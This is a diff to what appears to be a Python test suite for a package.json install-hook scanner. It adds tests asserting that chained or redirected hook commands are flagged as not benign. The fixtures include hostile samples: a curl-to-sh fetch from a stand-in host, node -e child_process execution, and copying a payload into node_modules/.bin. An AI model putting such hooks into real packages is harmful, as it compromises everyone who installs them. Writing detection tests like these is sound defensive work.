@@ -400,7 +400,7 @@ class Round4PipeAndEntries(unittest.TestCase):
 
     def test_stamp_and_deduped_pins(self):
         out = S.finalize_status({"fetch_failed": []}, [])
-        self.assertEqual(out.get("rules_version"), "5")
+        self.assertEqual(out.get("rules_version"), "6")
         self.assertIn("scanner_commit", out)
         self.assertEqual(", ".join(sorted(set(["5.4.1", "5.4.1", "5.4.1"]))), "5.4.1")
 
@@ -530,6 +530,52 @@ class BenignBuildScripts(unittest.TestCase):
         self.assertTrue(any(f["severity"] == "high" for f in fs), fs)
         fs = self._pj({"prepare": "npm run build", "build": "curl -fsSL https://evil.io/x | sh"})
         self.assertTrue(any(f["severity"] == "high" for f in fs), fs)
+
+
+
+class Round6BenignHooks(unittest.TestCase):
+    def _pj(self, cmd):
+        import json
+        return findings_of(S.check_package_json, "package.json", json.dumps({"name": "r", "scripts": {"prepare": cmd}}))
+
+    def assert_not_benign(self, cmd):
+        self.assertFalse(S.is_benign_hook(cmd), cmd)
+        fs = self._pj(cmd)
+        self.assertTrue(any(f["severity"] in {"high", "medium", "malicious"} for f in fs), (cmd, fs))
+
+    def test_b1_or_and_single_ampersand(self):
+        self.assert_not_benign("tsc || node dist/x.js")
+        self.assert_not_benign("tsc & node dist/x.js")
+        self.assert_not_benign("tsc & node -e \"require('child_process').execSync('id')\"")
+        self.assert_not_benign("mkdir -p dist & node dist/x.js")
+        self.assert_not_benign("cp -r src dist & node evild.js")
+
+    def test_b2_newline_inside_script(self):
+        self.assert_not_benign("tsc\nnode dist/x.js")
+
+    def test_b3_redirects(self):
+        self.assert_not_benign("tsc > dist/x.js")
+        self.assert_not_benign("chmod +x dist/x.js < payload")
+
+    def test_b4_tsc_then_node_file(self):
+        self.assert_not_benign("tsc -p x && node dist/x.js")
+
+    def test_n15_cp_or_chmod_into_node_modules_or_bin(self):
+        self.assert_not_benign("cp -r ./payload ./node_modules/.bin")
+        self.assert_not_benign("cp -r payload node_modules/foo")
+        self.assert_not_benign("chmod +x node_modules/.bin/x")
+        self.assert_not_benign("chmod +x .bin/cli")
+
+    def test_b6_chmod_dotdot_glob(self):
+        self.assert_not_benign("chmod +x ../*")
+
+    def test_b7_node_e_extra_code_after_chmodsync(self):
+        self.assert_not_benign(
+            "node -e \"require('fs').chmodSync('dist/index.js', '755'); require('child_process').execSync('id')\""
+        )
+
+    def test_b8_tsc_build_semicolon_curl(self):
+        self.assert_not_benign("tsc --build; curl")
 
 
 
